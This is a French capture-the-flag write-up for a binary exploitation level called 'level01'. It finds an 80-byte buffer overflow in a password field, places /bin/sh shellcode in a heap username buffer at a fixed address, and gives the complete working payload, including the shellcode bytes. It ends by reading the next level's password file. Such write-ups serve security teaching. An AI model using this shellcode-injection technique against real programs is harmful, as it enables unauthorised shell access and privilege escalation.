# level01

## Analyse du binaire

En inspectant le binaire avec `objdump -t ./level01`, on identifie une variable intéressante :  

a_user_name ```0x0804a040```


Cette variable est stockée sur la **heap**.  

En représentation **little-endian**, son adresse devient :  

```\x40\xa0\x04\x08```


---

## Étude du buffer overflow

Le champ `password` est vulnérable à un **buffer overflow**.  
Pour déterminer la taille nécessaire, on peut utiliser l’outil suivant :  

👉 [Wiremask Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)  

Résultat : le débordement survient après **80 caractères**.

---

## Stratégie d’exploitation

Le champ `username` est stocké sur la heap, à une adresse fixe.  
On peut donc y injecter un **shellcode** puis utiliser le débordement du `password` pour rediriger l’exécution vers ce shellcode.

### Paramètres à respecter

- Taille totale du champ `username` : **256 caractères**  
- Préfixe imposé : `"dat_wil"` (**8 octets**)  
- Taille du shellcode choisi : **21 octets**  
- Taille du padding : `256 - 8 - 21 = 227 octets`

---

## Shellcode utilisé

On peut réutiliser un shellcode classique pour exécuter `/bin/sh` :  
👉 [Source : Shell-Storm](https://shell-storm.org/shellcode/files/shellcode-575.html)

```asm
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

Construction du payload
Username
```"dat_wil" + "\x90"*227 + <shellcode>```

Password
```"\x90"*80 + "\x40\xa0\x04\x08"```

Payload complet
```python -c 'print "dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*80 + "\x40\xa0\x04\x08"' | ./level01```

Résultat

L’exécution de ce payload permet d’obtenir un shell avec les privilèges de level02.
```cat /home/users/level02/.pass```